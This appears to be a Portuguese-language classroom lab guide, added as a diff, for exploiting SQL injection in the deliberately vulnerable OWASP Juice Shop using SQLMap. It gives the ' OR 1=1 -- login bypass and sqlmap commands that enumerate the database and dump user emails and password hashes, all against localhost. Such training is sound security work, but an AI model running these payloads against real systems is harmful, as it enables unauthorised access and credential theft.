@@ -1,0 +1,142 @@
+# Guia Prático: Detecção e Exploração de SQL Injection com SQLMap
+
+---
+
+## 1. Introdução
+
+Este guia prático foi desenvolvido com o objetivo de fornecer um passo a passo detalhado para a configuração de um ambiente de laboratório controlado e a exploração de vulnerabilidades de **SQL Injection** utilizando a ferramenta **SQLMap**. O foco é compreender o ciclo completo de identificação, enumeração de banco de dados e extração de informações em uma aplicação web vulnerável.
+
+> **Aviso de Responsabilidade:** Este material é estritamente educacional. As técnicas aqui descritas devem ser utilizadas apenas em ambientes de laboratório isolados e com autorização prévia. A exploração de sistemas sem consentimento é crime.
+
+---
+
+## 2. Preparação do Ambiente de Laboratório
+
+Para realizar esta prática, precisaremos de um ambiente seguro e controlado. Em vez de utilizar os exemplos clássicos apresentados em sala, utilizaremos uma aplicação intencionalmente vulnerável moderna rodando em contêineres Docker, ou uma máquina virtual dedicada.
+
+Para esta prática, utilizaremos o **OWASP Juice Shop**, uma aplicação web moderna, construída em Node.js, Express e Angular, que contém diversas falhas de segurança, incluindo SQL Injection.
+
+### 2.1. Configuração da Máquina Atacante (Kali Linux)
+
+A máquina atacante será responsável por executar as ferramentas de exploração.
+
+1. Abra o terminal no Kali Linux.
+2. Atualize o sistema e certifique-se de que o SQLMap está instalado:
+   ```bash
+   sudo apt-get update
+   sudo apt install sqlmap
+   ```
+
+### 2.2. Configuração da Máquina Alvo (OWASP Juice Shop via Docker)
+
+A maneira mais simples e isolada de executar o OWASP Juice Shop é através do Docker.
+
+1. Na sua máquina (pode ser o próprio Kali Linux ou uma VM separada com Docker instalado), execute o seguinte comando no terminal:
+   ```bash
+   docker run -d -p 3000:3000 bkimminich/juice-shop
+   ```
+2. Verifique se o contêiner está rodando corretamente:
+   ```bash
+   docker ps
+   ```
+3. Acesse a aplicação no navegador através do endereço: `http://localhost:3000` (ou o IP da máquina onde o Docker está rodando, seguido da porta 3000).
+
+---
+
+## 3. Identificação da Vulnerabilidade (SQL Injection)
+
+O SQL Injection ocorre quando dados fornecidos pelo usuário são inseridos em uma consulta SQL sem a devida sanitização ou parametrização, permitindo que o atacante manipule a estrutura da consulta.
+
+### 3.1. Reconhecimento Manual
+
+1. Acesse a página inicial do OWASP Juice Shop.
+2. Navegue até a página de **Login** (`http://localhost:3000/#/login`).
+3. No campo de **Email**, insira o seguinte payload clássico de teste:
+   ```sql
+   ' OR 1=1 --
+   ```
+4. No campo de **Senha**, insira qualquer valor (ex: `teste123`).
+5. Clique em **Log in**.
+
+**Análise do Resultado:**
+Se a aplicação for vulnerável a este tipo de injeção (geralmente *Error-based* ou *Boolean-based*), o banco de dados interpretará a aspa simples `'` como o fim da string do email e a condição `OR 1=1` tornará a expressão verdadeira, ignorando a verificação de senha (comentada pelo `--`). No Juice Shop, você será autenticado como o primeiro usuário do banco de dados (frequentemente o administrador).
+
+### 3.2. Identificando Pontos de Entrada para Automação
+
+Para utilizar o SQLMap de forma eficaz, precisamos identificar uma requisição HTTP completa (com URL, parâmetros e cookies, se necessário) que possa ser testada.
+
+1. No navegador, abra as **Ferramentas de Desenvolvedor** (F12) e vá para a aba **Rede** (Network).
+2. Tente fazer um login falho (ex: usuário `teste@teste.com`, senha `senha`).
+3. Observe a requisição `POST` feita para o endpoint de login (geralmente `/rest/user/login`).
+4. Clique com o botão direito na requisição, selecione **Copiar** > **Copiar como cURL** ou salve os detalhes da requisição (URL e corpo dos dados) em um arquivo de texto chamado `login_req.txt`.
+
+---
+
+## 4. Exploração Automatizada com SQLMap
+
+O SQLMap é uma ferramenta open-source que automatiza o processo de detecção e exploração de falhas de injeção de SQL.
+
+### 4.1. Sintaxe Básica do SQLMap
+
+A estrutura geral do comando é:
+```bash
+sqlmap -u "URL_ALVO" [opções]
+```
+
+### 4.2. Prática 1: Detectando a Vulnerabilidade
+
+Vamos utilizar o SQLMap para confirmar a vulnerabilidade no endpoint de login que identificamos. Como se trata de uma requisição POST, precisamos passar os dados usando o parâmetro `--data`.
+
+1. No terminal do Kali Linux, execute o comando:
+   ```bash
+   sqlmap -u "http://localhost:3000/rest/user/login" --data="email=teste@teste.com&password=senha" --batch
+   ```
+   *Explicação:*
+   * `-u`: Define a URL alvo.
+   * `--data`: Define os dados enviados no corpo da requisição POST.
+   * `--batch`: Aceita automaticamente o comportamento padrão para todas as perguntas interativas do SQLMap.
+
+**Saída Esperada (Resumo):**
+O SQLMap testará vários payloads e identificará se o parâmetro `email` ou `password` é injetável, informando o tipo de injeção (ex: *time-based blind*, *boolean-based blind*).
+
+### 4.3. Prática 2: Enumeração do Banco de Dados
+
+Uma vez confirmada a vulnerabilidade, o próximo passo é mapear a estrutura do banco de dados.
+
+1. **Listar os Bancos de Dados:**
+   ```bash
+   sqlmap -u "http://localhost:3000/rest/user/login" --data="email=teste@teste.com&password=senha" --dbs --batch
+   ```
+   *Explicação:* O parâmetro `--dbs` solicita a listagem de todos os bancos de dados disponíveis no servidor.
+
+2. **Listar as Tabelas de um Banco Específico:**
+   Suponha que o banco de dados principal descoberto se chame `sqlite` ou similar (o Juice Shop usa SQLite por padrão).
+   ```bash
+   sqlmap -u "http://localhost:3000/rest/user/login" --data="email=teste@teste.com&password=senha" -D nome_do_banco --tables --batch
+   ```
+   *Explicação:* `-D` especifica o banco de dados e `--tables` lista suas tabelas.
+
+3. **Listar as Colunas de uma Tabela Específica:**
+   Identifique uma tabela interessante, como `Users`.
+   ```bash
+   sqlmap -u "http://localhost:3000/rest/user/login" --data="email=teste@teste.com&password=senha" -D nome_do_banco -T Users --columns --batch
+   ```
+   *Explicação:* `-T` especifica a tabela e `--columns` lista suas colunas.
+
+### 4.4. Prática 3: Extração de Dados (Data Dumping)
+
+A etapa final da exploração é a extração de informações sensíveis, como credenciais de usuários.
+
+1. **Extrair Dados de Colunas Específicas:**
+   Com base nas colunas descobertas (ex: `email`, `password`), execute:
+   ```bash
+   sqlmap -u "http://localhost:3000/rest/user/login" --data="email=teste@teste.com&password=senha" -D nome_do_banco -T Users -C email,password --dump --batch
+   ```
+   *Explicação:* `-C` especifica as colunas desejadas e `--dump` extrai e exibe os dados.
+
+**Saída Esperada:**
+O SQLMap exibirá uma tabela no terminal contendo os emails e os hashes (ou senhas em texto claro, dependendo da aplicação) extraídos do banco de dados. Se forem hashes, o SQLMap pode tentar quebrá-los automaticamente usando ataques de dicionário.
+
+---
+
+***Parabéns por ter encerrado mais uma prática!***
